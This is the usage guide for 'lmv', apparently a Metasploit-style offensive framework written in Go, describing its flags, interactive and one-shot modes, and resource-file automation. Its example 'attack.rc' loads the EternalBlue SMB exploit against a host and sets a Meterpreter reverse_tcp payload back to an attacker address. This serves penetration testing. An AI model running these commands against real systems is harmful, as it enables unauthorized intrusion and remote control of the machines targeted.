
# lmv - Usage Guide

Advanced modular framework written in Go (inspired by tools like Metasploit)

## Basic Syntax

lmv [flags]

## Available Flags / Options

| Flag              | Short | Type    | Default             | Description                                           |
|-------------------|-------|---------|---------------------|-------------------------------------------------------|
| --modules         |       | string  | ./modules           | Path to modules directory                             |
| --version         |       | bool    | false               | Show version information and exit                     |
| --idle-exec       |       | bool    | false               | Execute command(s) and exit (non-interactive mode)    |
| --idle-cmd        |       | string  | "help"              | Command to execute in idle mode (used with --idle-exec) |
| --banner          |       | bool    | true                | Show the official LanManVan banner                    |
| --r               | -r    | string  | "" (empty)          | Path to resource file (.rc) containing commands       |

## Common Usage Examples

### 1. Start interactive shell (most common)

# Normal start (with banner)
`lmv`

# Without banner
`lmv --banner=false`

### 2. Use custom modules directory

`lmv --modules /home/hamza/tools/lanmanvan-modules`
`lmv -modules ~/my-modules`

### 3. One-shot command execution (non-interactive)

# Run single command and exit
`lmv --idle-exec --idle-cmd "help"`

# Most common short form
`lmv -idle-exec -idle-cmd "use exploit/windows/smb/ms17_010_eternalblue"`

# One command without banner
`lmv -idle-exec -idle-cmd "show options" --banner=false`

### 4. Resource file / Script mode (Metasploit-style automation)

# Execute commands from file (banner shown once at beginning)
`lmv -r attack.rc`

# Silent execution (no banner)
`lmv -r auto-exploit.rc --banner=false`

# Custom modules + resource file
`lmv -r pentest-plan.rc --modules ./custom-modules`

### 5. Example resource file (attack.rc)

# Comments are allowed
```sh
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run -j -z
```
## Quick Reference Table


|Goal                                | Command Example                               | Banner?    |
|------------------------------------|-----------------------------------------------|------------|
| Normal interactive                 | lmv                                           | Yes        |
| Interactive, no banner             | lmv --banner=false                            | No         |
| One command & exit                 | lmv -idle-exec -idle-cmd "run"                | Yes        |
| One command, silent                | lmv -idle-exec -idle-cmd "run" --banner=false | No         |
| Run resource/script file           | lmv -r demo.rc                                | Yes (once) |
| Resource file silent               | lmv -r auto-hack.rc --banner=false            | No         |
| Custom modules + resource          | lmv -r attack.rc --modules ./mods             | Yes        |

## Notes

- Empty lines and lines starting with # are ignored in resource files
- Banner is shown only once even when using resource file with multiple commands
- --idle-cmd is ignored when using -r (resource file takes precedence)
- You can combine -r and -idle-exec but usually one is enough

Happy hacking!
